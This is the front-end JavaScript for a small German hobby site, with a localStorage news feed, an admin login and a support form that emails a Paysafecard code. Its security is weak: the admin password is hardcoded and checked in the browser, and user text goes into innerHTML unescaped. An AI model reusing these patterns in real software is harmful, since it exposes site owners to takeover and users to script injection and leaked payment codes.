const ADMIN_PASS="2409";

function loadNews(){
 const c=document.getElementById("newsContainer");
 if(!c)return;
 let n=JSON.parse(localStorage.getItem("news"))||[];
 c.innerHTML="";
 n.reverse().forEach(e=>{
  let d=document.createElement("div");
  d.className="apple-glass";
  d.innerHTML=`<h3>${e.title}</h3><p>${e.text}</p><small>${e.author} • ${e.date}</small>`;
  c.appendChild(d);
 });
}

function loginAdmin(){
 let n=document.getElementById("adminName").value;
 let p=document.getElementById("adminPass").value;
 if(p===ADMIN_PASS && n){
   document.getElementById("adminSection").style.display="none";
   document.getElementById("postSection").style.display="block";
   sessionStorage.setItem("admin",n);
 }else alert("Falsches Passwort");
}

function postNews(){
 let t=document.getElementById("newsTitle").value;
 let x=document.getElementById("newsText").value;
 let a=sessionStorage.getItem("admin");
 let n=JSON.parse(localStorage.getItem("news"))||[];
 n.push({title:t,text:x,author:a,date:new Date().toLocaleString()});
 localStorage.setItem("news",JSON.stringify(n));
 loadNews();
}

document.addEventListener("DOMContentLoaded",loadNews);

/* Sidebar öffnen/schließen */
const menuBtn = document.getElementById("menuBtn");
const sidebar = document.getElementById("sidebar");

menuBtn.addEventListener("click", () => {
  sidebar.classList.toggle("open");
});

/* Support Modal */
const supportBtn = document.getElementById('supportBtn');
const modal = document.getElementById('supportModal');
const closeBtn = document.getElementById('closeSupport');
const sendBtn = document.getElementById('sendSupport');

supportBtn.addEventListener('click', (e) => {
  e.preventDefault();
  modal.style.display = 'flex';
});

closeBtn.addEventListener('click', () => {
  modal.style.display = 'none';
});

window.addEventListener('click', (e) => {
  if (e.target === modal) modal.style.display = 'none';
});

sendBtn.addEventListener('click', () => {
  const code = document.getElementById('pscCode').value.trim();

  if (code.length !== 16) {
    alert("Bitte einen gültigen 16-stelligen Paysafecard-Code eingeben.");
    return;
  }

  const mail = "meowtroid24@proton.me";
  const subject = "TOOK WAR Support – Paysafecard";
  const body = "Zahlungsmethode: Paysafecard\nCode: " + code;

  window.location.href = `mailto:${mail}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
});
